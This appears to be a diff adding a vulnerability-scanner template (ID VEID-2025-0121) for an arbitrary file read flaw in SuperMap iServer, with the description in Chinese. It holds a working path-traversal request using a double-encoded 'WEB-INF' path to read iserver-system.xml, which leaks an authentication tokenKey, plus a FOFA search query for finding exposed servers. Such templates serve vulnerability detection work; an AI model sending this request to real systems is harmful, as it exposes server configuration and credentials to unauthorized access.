@@ -1,0 +1,26 @@
+## id: VEID-2025-0121
+## name: Supermap iServer任意文件读取漏洞
+## author: hack007x
+## severity: medium
+## tags: veid,file,veid2025
+## description: 北京超图软件股份有限公司是聚焦地理信息软件和空间智能领域的基础软件与应用软件厂商，Supermap iServer 存在文件读取漏洞，攻击者可获取用于认证的tokenKey
+## fofa-query: icon_hash="-1656662001"
+## verification: true
+
+
+GET /iserver/output/../WEB-IN%2546/iserver-system.xml HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: header["Content-Type"] contains "xml"
+#@ matcher: body contains "<?xml"
+
+
+
+
+
+# @VEIL-STAMP: 6821445bb769de48e66a1322b72bc23d49b26d79af41e7f126fb690aa9f04be9
